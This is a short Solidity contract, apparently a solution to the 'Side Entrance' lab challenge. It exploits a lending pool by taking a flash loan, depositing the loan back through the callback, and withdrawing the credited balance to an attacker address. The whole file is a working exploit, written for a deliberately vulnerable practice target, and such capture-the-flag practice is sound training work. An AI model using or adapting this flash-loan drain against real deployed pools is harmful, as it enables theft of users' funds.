// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";
import "./SideEntranceLenderPool.sol";
import "hardhat/console.sol";

/**
 * @title FlashLoanEtherReceiver
 * @author Luciana Silva
 */
contract FlashLoanEtherReceiver {
    //enable this to use the sendValue
    //using Address for address payable;
    SideEntranceLenderPool public pool;
    uint256 public poolBalance;

    constructor(address poolAddress, uint256 balance) {
        pool = SideEntranceLenderPool(poolAddress);
        poolBalance = balance;
    }

    function attack(address attacker) external {
        pool.flashLoan(poolBalance);
        pool.withdraw();
        //using the Address library
        //payable(attacker).sendValue(poolBalance);
        // the traditional way below
        (bool sent, ) = attacker.call{value: poolBalance}("");
        require(
            sent,
            "Failed to transfer Ether from the hack contract to attacker account"
        );
    }

    function execute() external payable {
        pool.deposit{value: poolBalance}();
    }

    receive() external payable {}
}
